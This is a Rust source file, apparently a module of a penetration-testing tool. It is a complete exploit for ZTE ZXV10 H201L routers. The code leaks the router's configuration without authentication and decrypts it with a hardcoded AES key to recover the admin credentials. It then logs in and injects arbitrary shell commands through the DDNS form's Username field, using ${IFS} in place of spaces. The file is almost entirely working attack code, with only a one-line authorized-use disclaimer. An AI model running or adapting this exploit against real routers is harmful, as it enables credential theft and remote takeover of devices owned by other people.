//! ZTE ZXV10 H201L Router RCE via Authentication Bypass
//!
//! This module exploits a vulnerability in ZTE ZXV10 H201L routers that allows
//! unauthenticated access to the router's configuration and subsequent RCE.
//!
//! ## Vulnerability Details
//! - **Affected Device**: ZTE ZXV10 H201L
//! - **Attack Vector**: Network (HTTP)
//! - **Impact**: Remote Code Execution, Credential Disclosure
//!
//! ## Attack Flow
//! 1. Leak encrypted configuration file
//! 2. Decrypt configuration to extract credentials
//! 3. Login with extracted credentials
//! 4. Inject command via DDNS form vulnerability
//!
//! ## Security Notes
//! - Uses utils.rs for target validation
//! - Proper error handling and timeouts
//! - Cleans up temporary files after exploitation
//!
//! For authorized penetration testing only.

use aes::Aes128;
use anyhow::{Result, anyhow};
use cipher::{BlockDecrypt, KeyInit, Block};
use colored::*;
use reqwest::{Client, cookie::Jar};
use std::{
    fs::{self, File},
    io::{Read, Write as StdWrite},
    net::TcpStream,
    sync::Arc,
};
use tokio::time::Duration;
use std::net::ToSocketAddrs;

use crate::utils::{
    normalize_target, prompt_int_range,
};

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   ZTE ZXV10 H201L RCE + Authentication Bypass             ║".cyan());
    println!("{}", "║   Router Configuration Leak & Command Injection           ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

/// AES-128 ECB decrypt without padding
fn decrypt_ecb_nopad(data: &[u8], key: &[u8]) -> Result<Vec<u8>> {
    if data.len() % 16 != 0 {
        anyhow::bail!("ECB decryption requires block-aligned data");
    }

    let cipher = Aes128::new_from_slice(key)?;
    let mut output = Vec::with_capacity(data.len());

    for chunk in data.chunks(16) {
        let mut arr = [0u8; 16];
        arr.copy_from_slice(chunk);
        let mut block = Block::<Aes128>::from(arr);
        cipher.decrypt_block(&mut block);
        output.extend_from_slice(&block);
    }

    Ok(output)
}

/// Parse and validate target using utils.rs normalize_target
/// Returns (host, port) tuple with proper IPv6 handling
async fn parse_target(target: &str) -> Result<(String, u16)> {
    // Use utils.rs normalize_target for comprehensive validation
    let normalized = normalize_target(target)?;
    
    // Check if normalized result contains a port
    if normalized.starts_with('[') {
        // IPv6 format: [::1]:port or [::1]
        if let Some(bracket_end) = normalized.find(']') {
            let host = normalized[1..bracket_end].to_string();
            let rest = &normalized[bracket_end + 1..];
            if rest.starts_with(':') {
                let port = rest[1..].parse::<u16>()
                    .map_err(|_| anyhow!("Invalid port number"))?;
                return Ok((host, port));
            } else {
                // No port provided, prompt for it
                let port = prompt_int_range("Target port", 80, 1, 65535)? as u16;
                return Ok((host, port));
            }
        }
        return Err(anyhow!("Invalid IPv6 format"));
    }
    
    // IPv4 or hostname format: host:port or host
    if let Some(colon_pos) = normalized.rfind(':') {
        let host = normalized[..colon_pos].to_string();
        let port = normalized[colon_pos + 1..].parse::<u16>()
            .map_err(|_| anyhow!("Invalid port number"))?;
        Ok((host, port))
    } else {
        // No port provided, prompt for it
        let port = prompt_int_range("Target port", 80, 1, 65535)? as u16;
        Ok((normalized, port))
    }
}

/// Leak the router config file
fn leak_config(host: &str, port: u16) -> Result<()> {
    println!("[*] Leaking config from http://{}:{}/ ...", host, port);

    // Resolve and connect with timeout
    let addr = (host, port)
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| anyhow!("Could not resolve address"))?;
    let timeout = Duration::from_secs(5);
    let mut conn = TcpStream::connect_timeout(&addr, timeout)?;

    let boundary = "----WebKitFormBoundarysQuwz2s3PjXAakFJ";
    let body = format!(
        "--{}\r\nContent-Disposition: form-data; name=\"config\"\r\n\r\n\r\n--{}--\r\n",
        boundary, boundary
    );

    let request = format!(
        "POST /getpage.gch?pid=101 HTTP/1.1\r\n\
         Host: {}:{}\r\n\
         Content-Type: multipart/form-data; boundary={}\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\r\n{}",
        host, port, boundary, body.len(), body
    );

    StdWrite::write_all(&mut conn, request.as_bytes())?;

    let mut response = vec![];
    conn.read_to_end(&mut response)?;
    if let Some(start) = response.windows(4).position(|w| w == b"\r\n\r\n") {
        let body = &response[start + 4..];
        StdWrite::write_all(&mut File::create("config.bin")?, body)?;
    }

    println!("[+] Config saved to config.bin");
    Ok(())
}

/// Decrypt config and extract credentials
fn decrypt_config(config_key: &[u8]) -> Result<(String, String)> {
    let mut encrypted = File::open("config.bin")?;
    let mut data = vec![];
    encrypted.read_to_end(&mut data)?;

    let mut key16 = [0u8; 16];
    key16[..config_key.len().min(16)].copy_from_slice(&config_key[..config_key.len().min(16)]);

    let decrypted = decrypt_ecb_nopad(&data, &key16)?;
    fs::write("decrypted.xml", &decrypted)?;

    let xml = fs::read_to_string("decrypted.xml")?;
    let username = xml.split("IGD.AU2").nth(1)
        .and_then(|s| s.split("User").nth(1))
        .and_then(|s| s.split("val=\"").nth(1))
        .and_then(|s| s.split('"').next())
        .unwrap_or("unknown")
        .to_string();

    let password = xml.split("IGD.AU2").nth(1)
        .and_then(|s| s.split("Pass").nth(1))
        .and_then(|s| s.split("val=\"").nth(1))
        .and_then(|s| s.split('"').next())
        .unwrap_or("unknown")
        .to_string();

    fs::remove_file("config.bin").ok();
    fs::remove_file("decrypted.xml").ok();

    println!("[+] Decrypted credentials: {} / {}", username, password);
    Ok((username, password))
}

/// Perform login
async fn login(session: &Client, host: &str, port: u16, username: &str, password: &str) -> Result<()> {
    println!("[*] Logging in to http://{}:{}/ ...", host, port);
    let url = format!("http://{}:{}/", host, port);
    let page = session.get(&url).send().await?.text().await?;

    let token = page.split("getObj(\"Frm_Logintoken\").value = \"").nth(1)
        .and_then(|s| s.split('"').next())
        .ok_or_else(|| anyhow!("Login token not found"))?;

    let body = format!(
        "Username={}&Password={}&frashnum=&Frm_Logintoken={}",
        urlencoding::encode(username),
        urlencoding::encode(password),
        token
    );
    session.post(&url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body)
        .send().await?;
    println!("[+] Login submitted.");
    Ok(())
}


/// Logout
async fn logout(session: &Client, host: &str, port: u16) -> Result<()> {
    let url = format!("http://{}:{}/", host, port);
    session.post(&url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body("logout=1")
        .send().await?;
    println!("[*] Logged out.");
    Ok(())
}

/// Command injection payload generator
fn command_injection(cmd: &str) -> String {
    let inj = format!("user;{};echo", cmd);
    inj.replace(" ", "${IFS}")
}

/// Abuse DDNS form to inject command
async fn set_ddns(session: &Client, host: &str, port: u16, payload: &str) -> Result<()> {
    let url = format!(
        "http://{}:{}/getpage.gch?pid=1002&nextpage=app_ddns_conf_t.gch",
        host, port
    );

    let form = [
        ("IF_ACTION", "apply"), ("Name", "dyndns"),
        ("Server", "http://www.dyndns.com/"), ("Username", payload),
        ("Password", "password"), ("Interface", "IGD.WD1.WCD3.WCIP1"),
        ("DomainName", "hostname"), ("Service", "dyndns"),
        ("Name0", "dyndns"), ("Server0", "http://www.dyndns.com/"),
        ("ServerPort0", "80"), ("UpdateInterval0", "86400"),
        ("RetryInterval0", "60"), ("MaxRetries0", "3"),
        ("Name1", "No-IP"), ("Server1", "http://www.noip.com/"),
        ("ServerPort1", "80"), ("UpdateInterval1", "86400"),
        ("RetryInterval1", "60"), ("MaxRetries1", "3"),
        ("Enable", "1"), ("HostNumber", "")
    ];

    println!("[*] Sending command injection payload...");
    // Manual form construction
    let mut body = String::new();
    for (key, val) in &form {
        if !body.is_empty() { body.push('&'); }
        body.push_str(&format!("{}={}", key, urlencoding::encode(val)));
    }
    
    session.post(&url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body)
        .send().await?;
    println!("[+] Payload delivered.");
    Ok(())
}

/// Exploit wrapper
async fn exploit(config_key: &[u8], host: &str, port: u16) -> Result<()> {
    let cookie_jar = Arc::new(Jar::default());
    let session = Client::builder()
        .cookie_provider(cookie_jar)
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10)) // ⏱️ HTTP timeout
        .build()?;

    leak_config(host, port)?;
    let (username, password) = decrypt_config(config_key)?;
    login(&session, host, port, &username, &password).await?;
    let payload = command_injection("echo hacked > /var/tmp/pwned");
    set_ddns(&session, host, port, &payload).await?;
    logout(&session, host, port).await?;
    println!("[✓] Exploit complete.");
    Ok(())
}


/// Dispatch entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();
    
    let (host, port) = parse_target(target).await?;
    println!("{}", format!("[*] Attacking {}:{}", host, port).cyan());
    
    let config_key = b"Renjx%2$CjM";
    match exploit(config_key, &host, port).await {
        Ok(_) => {
            println!("[*] Success on {}:{}", host, port);
            Ok(())
        }
        Err(e) => {
            println!("[!] Exploit failed: {}", e);
            Err(e)
        }
    }
}

